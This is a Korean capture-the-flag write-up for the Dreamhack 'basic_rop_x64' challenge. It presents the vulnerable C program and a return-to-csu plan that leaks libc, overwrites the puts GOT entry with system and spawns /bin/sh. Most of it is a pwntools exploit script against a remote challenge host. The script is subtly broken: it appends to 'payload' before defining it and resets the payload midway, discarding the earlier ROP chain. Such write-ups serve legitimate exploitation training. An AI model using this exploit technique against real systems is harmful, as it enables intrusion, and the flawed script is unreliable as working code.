---
title: "[Dreamhack] basic_rop_x6(RTC) Write up"
author: d0razi
date: 2023-08-18 10:45
categories: [InfoSec, Pwn]
tags: [Write up, Dreamhack]
image: /assets/img/media/banner/image.webp
---

## 문제 분석

```c
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>

void alarm_handler() {
    puts("TIME OUT");
    exit(-1);
}

void initialize() {
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int main(int argc, char *argv[]) {
    char buf[0x40] = {};

    initialize();

    read(0, buf, 0x400);
    write(1, buf, sizeof(buf));

    return 0;
}
```

Return to CSU 기법을 공부하기 위해 RTC 기법으로 풀었습니다. 

RTC 기법

got_overwrite를 해서 system함수를 호출하겠습니다.

익스플로잇 시나리오

1. **`puts(read_got)`** : libc_base를 leak하기 위해 puts함수를 이용해서 read함수의 got를 출력해줍니다.
2. **`read(0, bss, 8)`** : read 함수로 bss영역에 `/bin/sh\x00`을 입력해줍니다.
3. **`read(0, puts_got, 8)`** : read 함수로 got_overwrite을 진행합니다.
4. **`puts(bss)`** : got_overwrite이 완료된 puts 함수를 bss영역의 주소를 인자로 전달해주고 호출해줍니다.

## 최종 코드

```python
from pwn import *

p = remote("host3.dreamhack.games", 24366)
e = ELF("./basic_rop_x64")
libc = ELF("./libc.so.6")
# context.log_level="debug"

def slog(name, addr):
  return success(": ".join([name, hex(addr)]))

read_got = e.got["read"]
read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]
puts_got = e.got["puts"]

lib_csu_1 = 0x40087a
lib_csu_2 = 0x0000000000400860
bss = e.bss()

# puts(read_got)
payload += p64(0x00000000004005a9) # movaps issue
payload += p64(lib_csu_1)
payload += p64(0)
payload += p64(1)
payload += p64(puts_got)
payload += p64(0) + p64(0) + p64(read_got)
payload += p64(lib_csu_2)

# read(0, bss, 8)
payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8) + p64(bss) + p64(0)
payload += p64(lib_csu_2)

# puts got -> system got
payload = b'A'*72
payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(read_got)
payload += p64(8) + p64(puts_got) + p64(0)
payload += p64(lib_csu_2)

# puts(bss) -> system('/bin/sh')
payload += b'A' * 8
payload += p64(0)
payload += p64(1)
payload += p64(puts_got)
payload += p64(0) + p64(0) + p64(bss)
payload += p64(lib_csu_2)

p.sendline(payload)

p.recvuntil(b'A' * 64)
leak =  u64(p.recv(6) +b"\x00" * 2)
libc_base = leak - read_offset
system = libc_base + system_offset
slog("bss", bss)
slog("libc base", libc_base)
slog('system', system)

p.send(b'/bin/sh\x00')
p.send(p64(system))
p.interactive()
```

![Untitled](/assets/img/media/post_img/dreamhack/basic_rop_x64(rtc)/Untitled.png)

movaps issue 때문에 ret 가젯을 추가했습니다.

## 실행화면

![Untitled](/assets/img/media/post_img/dreamhack/basic_rop_x64(rtc)/Untitled%201.png)
